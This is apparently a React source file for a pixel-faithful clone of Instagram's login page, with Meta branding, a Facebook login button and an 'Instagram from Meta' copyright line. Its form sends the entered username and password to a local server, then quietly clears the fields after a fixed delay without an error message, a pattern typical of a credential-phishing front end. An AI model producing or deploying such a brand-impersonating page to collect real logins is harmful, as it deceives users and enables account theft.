import React, { useState } from "react";
import axios from "axios";

const LoginPage = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [passlen, setPasslen] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const MIN_LOADING_TIME = 1500; // 1.5 seconds
    const startTime = Date.now();

    try {
      let response = await axios.post("http://localhost:3000/", {
        username,
        password,
      });

      if (!response) {
        console.log("Internal Error Occurred");
      }

    } catch (err) {
      console.log(err);
    } finally {
      const elapsed = Date.now() - startTime;
      const remaining = Math.max(0, MIN_LOADING_TIME - elapsed);

      setTimeout(() => {
        setUsername("");
        setPassword("");
        setLoading(false);
      }, remaining);
    }
  };

  let changePass = (e) => {
    const newPass = e.target.value;
    setPassword(newPass);
    setPasslen(newPass.length >= 8);
  };

  return (
    <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
      {/* Main login box */}
      <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
        {/* Instagram-like logo */}
        <h1
          className="bg-no-repeat instagram-logo"
          style={{
            backgroundPosition: "0 -130px",
            height: "51px",
            width: "175px",
            backgroundImage: "url(https://bit.ly/3v2LT17)",
          }}
        ></h1>

        {/* Form */}
        <form className="mt-8 w-64 flex flex-col" onSubmit={handleSubmit}>
          <input
            className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
            id="email"
            placeholder="Phone number, username, or email"
            required
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />

          <div className="relative">
            <input
              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none pr-10"
              id="password"
              placeholder="Password"
              type={showPassword ? "text" : "password"}
              required
              value={password}
              onChange={(e) => changePass(e)}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-2 top-2 text-xs text-gray-500 select-none"
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`text-sm text-center ${passlen ? "bg-[#4150f7]" : "bg-[#808dfb]"} text-white py-1 rounded font-medium transition-all duration-200 flex justify-center items-center ${loading ? "cursor-not-allowed opacity-90" : "hover:bg-[#6b7cf3]"
              }`}
          >
            {loading ? (
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              "Log In"
            )}
          </button>
        </form>

        {/* Divider */}
        <div className="flex justify-evenly space-x-2 w-64 mt-4 items-center">
          <span className="bg-gray-300 h-px grow"></span>
          <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
            or
          </span>
          <span className="bg-gray-300 h-px grow"></span>
        </div>

        {/* Facebook login */}
        <button className="mt-4 flex items-center">
          <div
            className="bg-no-repeat mr-1"
            style={{
              backgroundPosition: "-414px -259px",
              backgroundImage: "url(https://bit.ly/3v2LT17)",
              height: "16px",
              width: "16px",
            }}
          ></div>
          <span className="text-xs text-blue-900 font-semibold cursor-pointer">
            Log in with Facebook
          </span>
        </button>

        {/* Forgot password */}
        <a
          href="#"
          className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4"
        >
          Forgot password?
        </a>
      </div>

      {/* Signup box */}
      <div className="bg-white border border-gray-300 text-center w-80 py-4">
        <span className="text-sm">Don't have an account? </span>
        <a href="#" className="text-blue-500 text-sm font-semibold">
          Sign up
        </a>
      </div>

      {/* Get the app section */}
      <div className="mt-3 text-center">
        <span className="text-[13px] font-medium">Get the app</span>
        <div className="flex mt-3 space-x-2 justify-center">
          <div
            className="bg-no-repeat"
            style={{
              backgroundPosition: "-132px -182px",
              height: "42px",
              width: "128px",
              backgroundImage: "url(https://bit.ly/3v2LT17)",
            }}
          ></div>
          <div
            className="bg-no-repeat"
            style={{
              backgroundPosition: "0 -182px",
              height: "42px",
              width: "130px",
              backgroundImage: "url(https://bit.ly/3v2LT17)",
            }}
          ></div>
        </div>
      </div>

      {/* Instagram-like footer */}
      <footer className="mt-8 mb-4 text-xs text-gray-500 text-center">
        <div className="flex flex-wrap justify-center gap-3 mb-3">
          <a href="#" className="hover:underline">
            Meta
          </a>
          <a href="#" className="hover:underline">
            About
          </a>
          <a href="#" className="hover:underline">
            Blog
          </a>
          <a href="#" className="hover:underline">
            Jobs
          </a>
          <a href="#" className="hover:underline">
            Help
          </a>
          <a href="#" className="hover:underline">
            API
          </a>
          <a href="#" className="hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:underline">
            Terms
          </a>
          <a href="#" className="hover:underline">
            Locations
          </a>
          <a href="#" className="hover:underline">
            Instagram Lite
          </a>
          <a href="#" className="hover:underline">
            Threads
          </a>
        </div>
        <div className="flex flex-wrap justify-center gap-2">
          <a href="#" className="hover:underline">
            Contact Uploading & Non-Users
          </a>
          <a href="#" className="hover:underline">
            Meta Verified
          </a>
        </div>
        <p className="mt-3">© {new Date().getFullYear()} Instagram from Meta</p>
      </footer>
    </div>
  );
};

export default LoginPage;
